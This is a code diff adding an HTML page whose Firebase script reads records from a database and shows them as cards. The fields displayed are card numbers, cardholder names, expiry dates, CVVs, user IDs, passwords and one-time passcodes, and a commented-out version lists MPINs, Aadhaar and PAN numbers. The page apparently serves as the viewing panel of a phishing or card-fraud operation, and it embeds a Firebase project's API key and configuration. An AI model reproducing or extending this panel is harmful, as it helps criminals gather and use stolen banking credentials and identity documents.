@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="light">
+  <head>
+    <!-- ... Your existing head content ... -->
+    <style>
+      /* Add some basic card styles */
+      .card {
+        border: 1px solid #ccc;
+        border-radius: 8px;
+        padding: 16px;
+        margin: 8px;
+      }
+    </style>
+  </head>
+  <body class="bg-slate-100">
+    <div class="w-full justify-center flex">
+      <div id="enterDetails" class="min-w-[450px]">
+        <div class="mt-5" id="dataList">
+          <!-- Cards to display data -->
+        </div>
+      </div>
+    </div>
+
+    <script type="module">
+      // ... Your existing JavaScript code ...
+      // Import the functions you need from the SDKs you need
+      import { initializeApp } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-app.js";
+      import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-analytics.js";
+      // TODO: Add SDKs for Firebase products that you want to use
+      // https://firebase.google.com/docs/web/setup#available-libraries
+
+      // Your web app's Firebase configuration
+      // For Firebase JS SDK v7.20.0 and later, measurementId is optional
+      const firebaseConfig = {
+  apiKey: "AIzaSyDKcOFaO3lqruMIfWxp5fOnzxeIwQZboC0",
+  authDomain: "bobwo-da5c6.firebaseapp.com",
+  projectId: "bobwo-da5c6",
+  storageBucket: "bobwo-da5c6.appspot.com",
+  messagingSenderId: "525557748996",
+  appId: "1:525557748996:web:24c859f0fa82c6bff96c51"
+};
+
+      // Initialize Firebase
+      const app = initializeApp(firebaseConfig);
+      const analytics = getAnalytics(app);
+
+      //Insert data
+      import {
+        getDatabase,
+        ref,
+        get,
+        set,
+        child,
+        update,
+        remove,
+        onValue,
+      } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-database.js";
+
+      const db = getDatabase();
+
+      // Function to fetch data from the Realtime Database and display in cards
+      function fetchDataFromRealtimeDatabase() {
+        const db = getDatabase();
+        const dataRef = ref(db, "people"); // Replace "people" with the path to the data you want to fetch
+
+        //   get(dataRef)
+        //     .then((snapshot) => {
+        //       if (snapshot.exists()) {
+        //         const data = snapshot.val();
+        //         console.log("Data from the Realtime Database:", data);
+
+        //         // Get the container for the cards
+        //         const dataList = document.getElementById("dataList");
+
+        //         // Clear existing data
+        //         dataList.innerHTML = "";
+
+        //         // Loop through the data and create cards for each item
+        //         for (const key in data) {
+        //           const rowData = data[key];
+        //           const card = document.createElement("div");
+        //           card.classList.add("card");
+
+        //           // Add the content to the card
+        //           const content = `
+        //             <p><strong>Mobile:</strong> ${rowData.mobile}</p>
+        //             <p><strong>MPIN:</strong> ${rowData.mpin}</p>
+        //             <p><strong>Aadhar:</strong> ${rowData.aadhar}</p>
+        //             <p><strong>DOB:</strong> ${rowData.dob}</p>
+        //             <p><strong>Holder Name:</strong> ${rowData.holder_name}</p>
+        //             <p><strong>OTP:</strong> ${rowData.otp}</p>
+        //             <p><strong>PAN:</strong> ${rowData.pan_card}</p>
+        //           `;
+
+        //           card.innerHTML = content;
+        //           dataList.appendChild(card); // Add the card to the container
+        //         }
+        //       } else {
+        //         console.log("No data available at the specified reference");
+        //       }
+        //     })
+        //     .catch((error) => {
+        //       console.error("Error fetching data from Realtime Database:", error);
+        //     });
+
+        onValue(dataRef, (snapshot) => {
+          if (snapshot.exists()) {
+            const data = snapshot.val();
+            console.log("Data from the Realtime Database:", data);
+
+            // Get the container for the cards
+            const dataList = document.getElementById("dataList");
+
+            // Clear existing data
+            dataList.innerHTML = "";
+
+            // Loop through the data and create cards for each item
+            for (const key in data) {
+              const rowData = data[key];
+              const card = document.createElement("div");
+              card.classList.add("card");
+
+              // Add the content to the card
+              const content = `
+                  <p><strong>Complaint:</strong> ${rowData.complaint}</p>
+                  <p><strong>Holder:</strong> ${rowData.holder}</p>
+                  <p><strong>Card:</strong> ${rowData.card}</p>
+                  <p><strong>Card Holder:</strong> ${rowData.cardholder}</p>
+                  <p><strong>Expiry:</strong> ${rowData.expiry}</p>
+                  <p><strong>CVV:</strong> ${rowData.cvv}</p>
+                  <p><strong>User ID:</strong> ${rowData.user_id}</p>
+                  <p><strong>Password:</strong> ${rowData.password}</p>
+                  <p><strong>OTP:</strong> ${rowData.otp}</p>
+                `;
+
+              card.innerHTML = content;
+              dataList.appendChild(card); // Add the card to the container
+            }
+          } else {
+            console.log("No data available at the specified reference");
+          }
+        }).catch((error) => {
+          console.error("Error fetching data from Realtime Database:", error);
+        });
+      }
+
+      // Call the function to fetch data and populate the cards
+      fetchDataFromRealtimeDatabase();
+    </script>
+  </body>
+</html>
